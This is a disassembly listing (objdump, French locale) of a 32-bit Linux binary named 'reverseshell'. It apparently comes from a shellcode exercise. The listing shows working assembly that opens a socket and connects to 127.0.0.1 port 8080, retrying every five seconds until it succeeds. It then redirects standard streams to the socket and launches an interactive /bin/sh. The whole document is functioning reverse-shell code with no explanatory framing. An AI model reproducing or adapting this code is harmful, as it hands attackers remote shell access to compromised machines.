
reverseshell:     format de fichier elf32-i386


Déassemblage de la section .text :

08049000 <arg0>:
 8049000:	2f                   	das    
 8049001:	62 69 6e             	bound  %ebp,0x6e(%ecx)
 8049004:	2f                   	das    
 8049005:	73 68                	jae    804906f <_start+0x2c>
	...

08049008 <arg1>:
 8049008:	2d 69 00         	sub    $0x53500069,%eax

0804900b <env0>:
 804900b:	50                   	push   %eax
 804900c:	53                   	push   %ebx
 804900d:	31 3d 5c 6e 5b 5c    	xor    %edi,0x5c5b6e5c
 8049013:	74 5d                	je     8049072 <_start+0x2f>
 8049015:	20 5c 75 40          	and    %bl,0x40(%ebp,%esi,2)
 8049019:	5c                   	pop    %esp
 804901a:	68 20 5c 77 5c       	push   $0x5c775c20
 804901f:	6e                   	outsb  %ds:(%esi),(%dx)
 8049020:	5c                   	pop    %esp
 8049021:	5c                   	pop    %esp
 8049022:	24 20                	and    $0x20,%al
 8049024:	3a 20                	cmp    (%eax),%ah
	...

08049027 <argv>:
 8049027:	00 90 04 08 08 90    	add    %dl,-0x6ff7f7fc(%eax)
 804902d:	04 08                	add    $0x8,%al
 804902f:	00 00                	add    %al,(%eax)
	...

08049033 <envv>:
 8049033:	0b 90 04 08 00 00    	or     0x804(%eax),%edx
	...

0804903b <timeval>:
 804903b:	05 00 00 00        	add    $0x1000000,%eax

0804903f <tv_usec>:
 804903f:	01 00                	add    %eax,(%eax)
	...

08049043 <_start>:
 8049043:	66 b8 67 01          	mov    $0x167,%ax
 8049047:	b3 02                	mov    $0x2,%bl
 8049049:	b1 01                	mov    $0x1,%cl
 804904b:	b2 06                	mov    $0x6,%dl
 804904d:	cd 80                	int    $0x80
 804904f:	97                   	xchg   %eax,%edi
 8049050:	31 c9                	xor    %ecx,%ecx
 8049052:	b9 80 ff ff fe       	mov    $0xfeffff80,%ecx
 8049057:	83 f1 ff             	xor    $0xffffffff,%ecx
 804905a:	51                   	push   %ecx
 804905b:	66 68 1f 90          	pushw  $0x901f
 804905f:	66 6a 02             	pushw  $0x2
 8049062:	89 e1                	mov    %esp,%ecx
 8049064:	6a 10                	push   $0x10
 8049066:	5a                   	pop    %edx
 8049067:	89 fb                	mov    %edi,%ebx
 8049069:	66 b8 6a 01          	mov    $0x16a,%ax
 804906d:	cd 80                	int    $0x80
 804906f:	40                   	inc    %eax
 8049070:	83 f8 01             	cmp    $0x1,%eax
 8049073:	75 02                	jne    8049077 <retry>
 8049075:	eb 32                	jmp    80490a9 <continue>

08049077 <retry>:
 8049077:	87 fb                	xchg   %edi,%ebx
 8049079:	31 c0                	xor    %eax,%eax
 804907b:	b0 a2                	mov    $0xa2,%al
 804907d:	bb 3b 90 04 08       	mov    $0x804903b,%ebx
 8049082:	31 c9                	xor    %ecx,%ecx
 8049084:	cd 80                	int    $0x80
 8049086:	b9 80 ff ff fe       	mov    $0xfeffff80,%ecx
 804908b:	83 f1 ff             	xor    $0xffffffff,%ecx
 804908e:	51                   	push   %ecx
 804908f:	66 68 1f 90          	pushw  $0x901f
 8049093:	66 6a 02             	pushw  $0x2
 8049096:	89 e1                	mov    %esp,%ecx
 8049098:	6a 10                	push   $0x10
 804909a:	5a                   	pop    %edx
 804909b:	89 fb                	mov    %edi,%ebx
 804909d:	66 b8 6a 01          	mov    $0x16a,%ax
 80490a1:	cd 80                	int    $0x80
 80490a3:	40                   	inc    %eax
 80490a4:	83 f8 01             	cmp    $0x1,%eax
 80490a7:	75 ce                	jne    8049077 <retry>

080490a9 <continue>:
 80490a9:	87 df                	xchg   %ebx,%edi
 80490ab:	6a 02                	push   $0x2
 80490ad:	59                   	pop    %ecx

080490ae <loop>:
 80490ae:	b0 3f                	mov    $0x3f,%al
 80490b0:	cd 80                	int    $0x80
 80490b2:	49                   	dec    %ecx
 80490b3:	79 f9                	jns    80490ae <loop>
 80490b5:	bb 00 90 04 08       	mov    $0x8049000,%ebx
 80490ba:	b9 27 90 04 08       	mov    $0x8049027,%ecx
 80490bf:	ba 33 90 04 08       	mov    $0x8049033,%edx
 80490c4:	b0 0b                	mov    $0xb,%al
 80490c6:	cd 80                	int    $0x80
